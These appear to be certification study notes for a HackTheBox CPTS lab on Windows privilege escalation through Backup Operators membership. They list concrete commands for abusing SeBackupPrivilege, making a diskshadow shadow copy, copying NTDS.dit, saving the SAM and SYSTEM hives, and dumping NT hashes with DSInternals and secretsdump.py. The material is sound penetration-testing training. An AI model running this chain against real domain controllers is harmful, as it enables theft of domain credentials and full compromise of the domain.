The main lesson is:

> **A Windows group can indirectly give you powerful privileges. Therefore, `whoami /groups` is just as important as `whoami /priv`.**

Windows has built-in groups that can grant special privileges, and some of those memberships can become privilege-escalation paths.

![Image](https://images.openai.com/static-rsc-4/tzx0Hz7bqk7FylwragXwQeIIHxKjrmXKk0zu1xBc4GdXDpgNsJPQ68NDaiRhH65Q67gIXCdxLMCMJRS_SLuvvIXt3XqgnMEMHKukMbnzgr57KeDfG49wXIAPj0sNPHqfDX2kQ6WFs_IFOsWoKtFpRGRTL6FKgygHaYDBKxsA17ax4yaqKj-QGCdBPnO5jsqY?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/AU9hqEYV_DJwjfOLy_tUvhVjzQb36G0IFjr8ZzETyEST4ZEDA8TB8P7TLg6bv5jG6F1en67Torw6POb1rdxRTujit8Wd67maXo7NVpCNtSs_9GUopGb4bQGJ0ebLtYp4xbFjlGPmdwRTatQt-oNBYYC6r5gJge2A4Wuh9x5fzGDgVeZCFzJDj3DKBWvX2scU?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/fSevCXvwSzbsMOsUcBn8yk6e-2HjQCJUe51NoKoY0zzuaOL7K0Jmjcpvx-uy4hZTZItKp1MrKOybP5jjh_ZM5i4cFazTF7yHxATJiJelJ_ntb_66tkQYc4tNn5au88mf206p9GelTE6zHw50x4Eip_w-ERS23sLOmSme1PwkknM-AW-ZaM_lOiOYl_KatzFq?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/zA5dYvdgA7nxfAU14ZPGGN0S2kqrxOIPBErsCREHmudyxa6xtor5nEupOqU1qmUxrBSHeSWB_KLdLSiqBMtlDPrdOUSmmwJK8W6ItEkAUuUwiF_4pPAq1z1SPg5vqL2y8YUKSNJ-UnIel7I0JbqYsWFOHKD9wpAILaMPB5Y4i1dWsULl5IwwQ92XgdAOJtQ4?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/zChugrj1J5Byl7EPC8jlTDBNmRGFElXFzR75yc-u_I1N116ckiiMmta3VBPsJhC8t-dF7U_0gHGGEFXQao5bMmf5W-ugXWChUZmNgJg4fOK9ijuZhn1HuizgZV4AtzPidtjZM4yb89UFwxVOa88Jxy4HknqP7GYffRtdU0mjCmXZIBuJHEo0iJgyO9dnQrK6?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/ZWXjY-7AeCQTZhF1wYrnQP4hssIYRZeaC_47WtRUxpUHdhvrVQ8xZnVia00J0ODKzx1fWvjwT48cCsjzBW18kskG7kHJOvLVBbVdKAcziybTBL337LNGJciMVNXYGzjaCdjiJZ2-1sn7q_81gqTjGOI6uCZds6I1zFQwDogaz3wO6SmCcrzqC6JuQPecarRD?purpose=fullsize)

---

# 1. Groups You Should Recognize

The section focuses on:

```text
Backup Operators
Event Log Readers
DnsAdmins
Hyper-V Administrators
Print Operators
Server Operators
```

For CPTS, the most important one in this section is:

```text
Backup Operators
        ↓
SeBackupPrivilege
SeRestorePrivilege
```

The reason is that `SeBackupPrivilege` can provide access to protected files even when normal ACL permissions don't grant access.

---

# 2. First Enumeration

After obtaining a Windows shell:

```cmd
whoami
```

Then:

```cmd
whoami /groups
```

Then:

```cmd
whoami /priv
```

### Mental model

```text
whoami
   ↓
Who am I?

whoami /groups
   ↓
Which groups am I in?

whoami /priv
   ↓
Which privileges does my token have?
```

Don't only search for:

```text
Administrators
Domain Admins
```

A user in:

```text
Backup Operators
```

may have a very interesting privilege-escalation path without being a normal Administrator.

---

# 3. Backup Operators → SeBackupPrivilege

The source states that membership in **Backup Operators** grants:

```text
SeBackupPrivilege
SeRestorePrivilege
```

The important privilege here is:

```text
SeBackupPrivilege
```

It allows backup-style access to files and directories, including situations where the user's normal ACL permissions would deny access.

---

# 4. `SeBackupPrivilege`

Check it:

```cmd
whoami /priv
```

Example:

```text
SeBackupPrivilege    Disabled
SeRestorePrivilege   Disabled
```

You can also check it with:

```powershell
Get-SeBackupPrivilege
```

Output:

```text
SeBackupPrivilege is disabled
```

---

# 5. Enable It

The HTB example uses:

```powershell
Set-SeBackupPrivilege
```

Then:

```powershell
Get-SeBackupPrivilege
```

Output:

```text
SeBackupPrivilege is enabled
```

Verify:

```cmd
whoami /priv
```

You should now see:

```text
SeBackupPrivilege    Enabled
```

---

# 6. Protected File Example

Suppose:

```text
C:\Confidential\2021 Contract.txt.txt
```

exists.

You can enumerate it:

```powershell
dir C:\Confidential\
```

but:

```powershell
cat 'C:\Confidential\2021 Contract.txt.txt'
```

returns:

```text
Access to the path ... is denied.
```

Normally:

```text
ACL → DENY
      ↓
   Can't read
```

But `SeBackupPrivilege` provides a different access path.

---

# 7. Backup-Aware Copy

The source uses:

```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt.txt' .\Contract.txt
```

Result:

```text
Copied 88 bytes
```

Then:

```powershell
cat .\Contract.txt
```

can read the copied data.

### Important concept

You aren't doing:

```text
ACL modification
```

Instead:

```text
Protected file
      ↓
SeBackupPrivilege
      ↓
Backup semantics
      ↓
Copy file
      ↓
Read copied file
```

---

# 🔥 8. Why `NTDS.dit` Is Important

Now the module moves from an ordinary protected file to a **Domain Controller**.

The Active Directory database is:

```text
C:\Windows\NTDS\ntds.dit
```

The source describes `NTDS.dit` as containing NTLM hashes for domain user and computer objects.

So:

```text
Backup Operators
       ↓
SeBackupPrivilege
       ↓
Protected files
       ↓
NTDS.dit
       ↓
Domain credential material
```

This is a major CPTS concept.

---

# 9. Why Shadow Copy?

`NTDS.dit` is normally locked because Windows/Active Directory is actively using it.

The section demonstrates using:

```text
diskshadow.exe
```

to create a shadow copy of the C: drive and expose it as another drive.

Conceptually:

```text
LIVE SYSTEM

C:
└── Windows
    └── NTDS
        └── ntds.dit
             ↑
            LOCKED


       ↓ diskshadow


SHADOW COPY

E:
└── Windows
    └── NTDS
        └── ntds.dit
             ↑
          accessible copy
```

---

# 10. `diskshadow` Sequence

The source uses:

```text
diskshadow.exe
```

Then:

```text
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
```

Now:

```powershell
dir E:
```

shows the shadow copy.

---

# 11. Copy `NTDS.dit`

Using the backup privilege:

```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

The source demonstrates the successful copy.

Now:

```text
C:\Tools\ntds.dit
```

is available for offline processing.

---

# 12. SAM and SYSTEM

`SeBackupPrivilege` can also be used to back up:

```text
SAM
SYSTEM
```

The source demonstrates:

```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
```

and:

```cmd
reg save HKLM\SAM SAM.SAV
```

Think:

```text
             SeBackupPrivilege
                    │
          ┌─────────┼──────────┐
          ↓         ↓          ↓
       Files     NTDS.dit    SAM/SYSTEM
                    │
                    ↓
              Credential
               material
```

---

# ⚠️ 13. Important ACL Exception

This is a **CPTS trap question**.

The source specifically says an explicit **DENY** entry for your user or a group you belong to can prevent access even when `FILE_FLAG_BACKUP_SEMANTICS` is specified.

So don't memorize:

> `SeBackupPrivilege` = unlimited access to everything.

Instead:

> **SeBackupPrivilege provides backup-based access, but explicit deny entries can still prevent access.**

---

# 14. Extracting Credentials from `NTDS.dit`

The source demonstrates **DSInternals**.

First:

```powershell
Import-Module .\DSInternals.psd1
```

Get the boot key:

```powershell
$key = Get-BootKey -SystemHivePath .\SYSTEM
```

Then query the database:

```powershell
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

The output contains account information and credential material, including an NT hash.

---

# 15. `secretsdump.py`

Another option shown by the source is Impacket's:

```text
secretsdump.py
```

Example:

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

The output has the familiar format:

```text
username:RID:LMhash:NThash
```

For example:

```text
Administrator:500:<LM>:<NT>
```

The source identifies possible follow-up uses as **Pass-the-Hash** or offline password cracking with Hashcat.

---

# 16. Built-in Alternative — `robocopy`

This is an excellent thing to remember for CPTS.

You don't necessarily need a third-party copying tool.

Windows includes:

```text
robocopy
```

The source demonstrates its backup mode:

```text
/B
```

Example:

```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

The copy completes successfully, demonstrating that the built-in Windows utility can perform the backup-mode copy.

### CPTS memory:

```text
/B = Backup mode
```

---

# 🧠 The Most Important Comparison

You've now covered:

### `SeTakeOwnershipPrivilege`

```text
Take ownership
      ↓
Modify ACL
      ↓
Access object
```

### `SeBackupPrivilege`

```text
Backup semantics
      ↓
Copy protected data
      ↓
Analyze offline
```

### `SeDebugPrivilege`

```text
Access/process manipulation
      ↓
LSASS / privileged processes
      ↓
Credential material or SYSTEM
```

### `SeImpersonatePrivilege`

```text
Impersonate token
      ↓
Potato-style techniques
      ↓
SYSTEM
```

---

# 🔥 CPTS Mental Model

When you see:

```text
whoami /groups
```

and find:

```text
Backup Operators
```

immediately connect:

```text
Backup Operators
       ↓
SeBackupPrivilege
       ↓
whoami /priv
       ↓
Enable if required
       ↓
Protected files
       │
       ├── Normal sensitive files
       │
       ├── SAM + SYSTEM
       │
       └── DC → NTDS.dit
```

If it's a **Domain Controller**, `NTDS.dit` should immediately come to mind.

---

# 🏆 CPTS Must-Know Commands

### Group enumeration

```cmd
whoami /groups
```

### Privilege enumeration

```cmd
whoami /priv
```

### Check SeBackupPrivilege

```powershell
Get-SeBackupPrivilege
```

### Enable it in the HTB example

```powershell
Set-SeBackupPrivilege
```

### Backup-aware file copy

```powershell
Copy-FileSeBackupPrivilege <source> <destination>
```

### Create shadow copy

```text
diskshadow.exe
```

### Save registry hives

```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

### Extract AD database credentials offline

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

### Built-in backup-mode copy

```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

---

## 🧠 One-line memory trick

> **`Backup Operators → SeBackupPrivilege → backup semantics → protected files → NTDS.dit/SAM/SYSTEM → offline credential extraction`.**

And the distinction you should have burned into your head:

> **`SeTakeOwnership` = change ownership. `SeBackup` = copy/access through backup semantics. `SeDebug` = interact with privileged processes. `SeImpersonate` = abuse tokens.**